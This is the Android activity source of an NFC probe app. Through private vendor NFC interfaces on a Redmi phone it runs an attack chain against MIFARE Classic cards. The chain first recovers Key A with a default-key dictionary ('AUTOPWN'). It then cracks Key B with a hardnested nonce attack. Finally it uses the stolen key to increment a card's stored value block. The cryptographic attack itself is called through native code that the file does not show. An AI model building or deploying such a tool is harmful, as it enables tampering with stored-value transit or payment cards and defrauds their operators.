package com.redmi.iceman.probe;

import android.app.Activity;
import android.graphics.Color;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import com.tms.nfc.IHciAdapter;
import com.tms.nfc.IHciCallback;
import com.tms.nfc.ITmsNfcAdapter;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {
    private static final String TAG = "TmsProbe";

    private TextView logView;
    private EditText hexInput;
    private EditText blockInput;
    private EditText trgBlockInput;
    private EditText keyInput;
    private EditText deltaInput;
    private ITmsNfcAdapter adapter;
    private IHciAdapter hciAdapter;
    private PtmTransport ptmTransport;
    private boolean ptmOpen = false;
    private boolean mfcInited = false;
    private Tag lastTag;

    private final IHciCallback.Stub hciCallback = new IHciCallback.Stub() {
        @Override
        public void onHciDataReceive(byte[] data) {
            log("PTM RX <- " + toHex(data));
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout outer = new LinearLayout(this);
        outer.setOrientation(LinearLayout.VERTICAL);
        outer.setPadding(24, 48, 24, 24);

        // All inputs/buttons live in their own scrollable area (named
        // "root" below, as before) so they stay reachable no matter how
        // many get added; the log keeps a fixed height at the bottom so
        // it's visible without stealing scroll space from the controls.
        ScrollView controlsScroll = new ScrollView(this);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        controlsScroll.addView(root);
        outer.addView(controlsScroll, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));

        hexInput = new EditText(this);
        hexInput.setHint("hex bytes, e.g. 26");
        root.addView(hexInput);

        addButton(root, "1. Get TMS adapter", new View.OnClickListener() {
            public void onClick(View v) { doGetAdapter(); }
        });
        addButton(root, "2. Info (model/fw/mw)", new View.OnClickListener() {
            public void onClick(View v) { doInfo(); }
        });
        addButton(root, "3. Enable NFC reader mode", new View.OnClickListener() {
            public void onClick(View v) { doEnableReaderMode(); }
        });
        addButton(root, "4. sendNciCommand(hex)", new View.OnClickListener() {
            public void onClick(View v) { doSendNci(); }
        });
        addButton(root, "4b. changeRfParams(hex) [only needs NFC perm]", new View.OnClickListener() {
            public void onClick(View v) { doChangeRfParams(); }
        });
        addButton(root, "5. PTM open", new View.OnClickListener() {
            public void onClick(View v) { doPtmOpen(); }
        });
        addButton(root, "6. PTM transceive(hex)", new View.OnClickListener() {
            public void onClick(View v) { doPtmTransceive(); }
        });
        addButton(root, "7. PTM close", new View.OnClickListener() {
            public void onClick(View v) { doPtmClose(); }
        });
        addButton(root, "Clear log", new View.OnClickListener() {
            public void onClick(View v) { logView.setText(""); }
        });

        blockInput = new EditText(this);
        blockInput.setHint("source block, e.g. 0");
        root.addView(blockInput);

        trgBlockInput = new EditText(this);
        trgBlockInput.setHint("target block (hardnested), e.g. 4");
        root.addView(trgBlockInput);

        keyInput = new EditText(this);
        keyInput.setHint("key hex (12 chars), e.g. FFFFFFFFFFFF");
        root.addView(keyInput);

        deltaInput = new EditText(this);
        deltaInput.setHint("value --inc delta, e.g. 1");
        root.addView(deltaInput);

        addButton(root, "A. AUTOPWN: recover Key A of block", new View.OnClickListener() {
            public void onClick(View v) { doAutopwn(); }
        });
        addButton(root, "B. HARDNESTED: Key A -> Key B of target block", new View.OnClickListener() {
            public void onClick(View v) { doHardnested(); }
        });
        addButton(root, "C. VALUE --inc with Key B", new View.OnClickListener() {
            public void onClick(View v) { doValueIncrement(); }
        });

        // Fixed-height log area, always visible below the scrollable
        // controls above rather than competing with them for scroll space.
        ScrollView logScroll = new ScrollView(this);
        logView = new TextView(this);
        logView.setTextColor(Color.GREEN);
        logView.setTextIsSelectable(true);
        logScroll.addView(logView);
        outer.addView(logScroll, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 400));

        setContentView(outer);
    }

    private void addButton(LinearLayout root, String text, View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(text);
        b.setOnClickListener(l);
        root.addView(b);
    }

    private void log(String s) {
        Log.d(TAG, s);
        final String line = s;
        runOnUiThread(new Runnable() {
            public void run() { logView.append(line + "\n"); }
        });
    }

    private void doGetAdapter() {
        try {
            adapter = TmsAccess.getAdapter();
            log("OK: got ITmsNfcAdapter = " + adapter);
        } catch (Exception e) {
            log("FAIL getAdapter: " + e);
            Log.e(TAG, "getAdapter failed", e);
        }
    }

    private void doInfo() {
        if (!ensureAdapter()) return;
        try {
            log("model=" + adapter.getNfcModelName());
            log("fw=" + adapter.getNfcFwVersion());
            log("mw=" + adapter.getMwVersion());
            log("serial=" + toHex(adapter.getNfccSerialNumber()));
        } catch (Exception e) {
            log("FAIL info: " + e);
            Log.e(TAG, "info failed", e);
        }
    }

    private void doEnableReaderMode() {
        try {
            NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this);
            if (nfcAdapter == null) {
                log("FAIL: NfcAdapter.getDefaultAdapter null");
                return;
            }
            Bundle options = new Bundle();
            nfcAdapter.enableReaderMode(this, new NfcAdapter.ReaderCallback() {
                        public void onTagDiscovered(android.nfc.Tag tag) {
                            lastTag = tag;
                            log("tag discovered via NfcAdapter: " + tag + " uid=" + toHex(tag.getId()));
                        }
                    },
                    NfcAdapter.FLAG_READER_NFC_A | NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK
                            | NfcAdapter.FLAG_READER_NO_PLATFORM_SOUNDS,
                    options);
            log("OK: reader mode enabled (NFC-A only)");
        } catch (Exception e) {
            log("FAIL enableReaderMode: " + e);
            Log.e(TAG, "enableReaderMode failed", e);
        }
    }

    private void doSendNci() {
        if (!ensureAdapter()) return;
        byte[] cmd = fromHex(hexInput.getText().toString());
        if (cmd == null) { log("bad hex"); return; }
        try {
            log("NCI TX -> " + toHex(cmd));
            byte[] rsp = adapter.sendNciCommand(cmd);
            log("NCI RX <- " + toHex(rsp));
        } catch (Exception e) {
            log("FAIL sendNciCommand: " + e);
            Log.e(TAG, "sendNciCommand failed", e);
        }
    }

    private void doChangeRfParams() {
        if (!ensureAdapter()) return;
        byte[] cmd = fromHex(hexInput.getText().toString());
        if (cmd == null) { log("bad hex"); return; }
        try {
            log("changeRfParams TX -> " + toHex(cmd));
            int status = adapter.changeRfParams(cmd, false);
            log("changeRfParams status = " + status);
        } catch (Exception e) {
            log("FAIL changeRfParams: " + e);
            Log.e(TAG, "changeRfParams failed", e);
        }
    }

    private void doPtmOpen() {
        if (!ensureAdapter()) return;
        try {
            IBinder b = adapter.getHciAdapterService();
            log("getHciAdapterService() -> " + b);
            if (b == null) { log("FAIL: hci adapter service binder is null"); return; }
            hciAdapter = IHciAdapter.Stub.asInterface(b);
            ptmTransport = new PtmTransport(hciAdapter);
            ptmOpen = true;
            log("OK: PTM open()");
        } catch (Exception e) {
            log("FAIL PTM open: " + e);
            Log.e(TAG, "PTM open failed", e);
        }
    }

    // --- one-time asset extraction: assets/resources/hardnested_tables/*
    // (bundled verbatim from upstream's client/resources/hardnested_tables/)
    // -> <filesDir>/resources/hardnested_tables/, matching what
    // mfc_resources_set_base_dir()/searchFile() (native side) expect.
    private String ensureResourcesExtracted() {
        File base = new File(getFilesDir(), "resources/hardnested_tables");
        File marker = new File(getFilesDir(), ".resources_extracted");
        if (marker.exists() && base.isDirectory() && base.list() != null && base.list().length > 0) {
            return getFilesDir().getAbsolutePath();
        }
        try {
            base.mkdirs();
            String[] names = getAssets().list("resources/hardnested_tables");
            for (String name : names) {
                InputStream in = getAssets().open("resources/hardnested_tables/" + name);
                OutputStream out = new FileOutputStream(new File(base, name));
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
                in.close();
                out.close();
            }
            new FileOutputStream(marker).close();
            log("extracted " + names.length + " hardnested table files");
        } catch (Exception e) {
            log("FAIL extracting resources: " + e);
            Log.e(TAG, "resource extraction failed", e);
        }
        return getFilesDir().getAbsolutePath();
    }

    private boolean ensureMfcReady() {
        if (!ptmOpen || ptmTransport == null) { log("PTM not open, tap 5 first"); return false; }
        if (lastTag == null) { log("no tag discovered yet, tap a card first"); return false; }
        if (!mfcInited) {
            String resDir = ensureResourcesExtracted();
            int ret = MfcNative.nativeInit(ptmTransport, resDir);
            if (ret != 0) { log("FAIL nativeInit: " + ret); return false; }
            mfcInited = true;
        }
        byte[] uidBytes = lastTag.getId();
        int uid = 0;
        for (int i = 0; i < 4 && i < uidBytes.length; i++) {
            uid = (uid << 8) | (uidBytes[i] & 0xFF);
        }
        MfcNative.nativeSetUid(uid);
        return true;
    }

    private int parseBlock(EditText field, int fallback) {
        try {
            return Integer.parseInt(field.getText().toString().trim());
        } catch (Exception e) {
            return fallback;
        }
    }

    private void doAutopwn() {
        if (!ensureMfcReady()) return;
        final int block = parseBlock(blockInput, 0);
        log("AUTOPWN: trying default-key dictionary against block " + block + " Key A ...");
        new Thread(new Runnable() {
            public void run() {
                String key = MfcNative.nativeAutopwn(block);
                if (key == null) {
                    log("AUTOPWN: no default key worked");
                } else {
                    log("AUTOPWN: Key A = " + key);
                    finalKeyToField(key);
                }
            }
        }).start();
    }

    private void finalKeyToField(final String key) {
        runOnUiThread(new Runnable() {
            public void run() { keyInput.setText(key); }
        });
    }

    private void doHardnested() {
        if (!ensureMfcReady()) return;
        final int block = parseBlock(blockInput, 0);
        final int trgBlock = parseBlock(trgBlockInput, block);
        final String keyA = keyInput.getText().toString().trim();
        if (keyA.length() != 12) { log("put the known Key A (12 hex chars) in the key field first"); return; }
        log("HARDNESTED: acquiring nonces against block " + trgBlock + " Key B, using known Key A=" + keyA + " on block " + block + " ... this can take a while");
        new Thread(new Runnable() {
            public void run() {
                String keyB = MfcNative.nativeHardnested(block, keyA, trgBlock);
                if (keyB == null) {
                    log("HARDNESTED: failed");
                } else {
                    log("HARDNESTED: Key B = " + keyB);
                    finalKeyToField(keyB);
                }
            }
        }).start();
    }

    private void doValueIncrement() {
        if (!ensureMfcReady()) return;
        final int block = parseBlock(blockInput, 0);
        final String keyB = keyInput.getText().toString().trim();
        if (keyB.length() != 12) { log("put Key B (12 hex chars) in the key field first"); return; }
        int delta;
        try {
            delta = Integer.parseInt(deltaInput.getText().toString().trim());
        } catch (Exception e) {
            delta = 1;
        }
        final int fdelta = delta;
        log("VALUE --inc: block " + block + " delta " + fdelta + " with Key B=" + keyB);
        new Thread(new Runnable() {
            public void run() {
                int ret = MfcNative.nativeValueIncrement(block, keyB, fdelta);
                log("VALUE --inc result = " + ret + (ret == 0 ? " (OK)" : " (FAILED)"));
            }
        }).start();
    }

    private void doPtmTransceive() {
        if (!ptmOpen || hciAdapter == null) { log("PTM not open"); return; }
        byte[] data = fromHex(hexInput.getText().toString());
        if (data == null) { log("bad hex"); return; }
        try {
            log("PTM TX -> " + toHex(data));
            hciAdapter.transceive(data);
        } catch (RemoteException e) {
            log("FAIL PTM transceive: " + e);
            Log.e(TAG, "PTM transceive failed", e);
        }
    }

    private void doPtmClose() {
        if (hciAdapter == null) { log("PTM not open"); return; }
        try {
            hciAdapter.close();
            ptmOpen = false;
            log("OK: PTM close()");
        } catch (RemoteException e) {
            log("FAIL PTM close: " + e);
            Log.e(TAG, "PTM close failed", e);
        }
    }

    private boolean ensureAdapter() {
        if (adapter == null) {
            log("adapter not initialized, tap 1 first");
            return false;
        }
        return true;
    }

    private static String toHex(byte[] b) {
        if (b == null) return "null";
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02X ", x));
        return sb.toString().trim();
    }

    private static byte[] fromHex(String s) {
        s = s.replaceAll("[^0-9A-Fa-f]", "");
        if (s.isEmpty() || s.length() % 2 != 0) return null;
        byte[] out = new byte[s.length() / 2];
        for (int i = 0; i < out.length; i++) {
            out[i] = (byte) Integer.parseInt(s.substring(i * 2, i * 2 + 2), 16);
        }
        return out;
    }
}
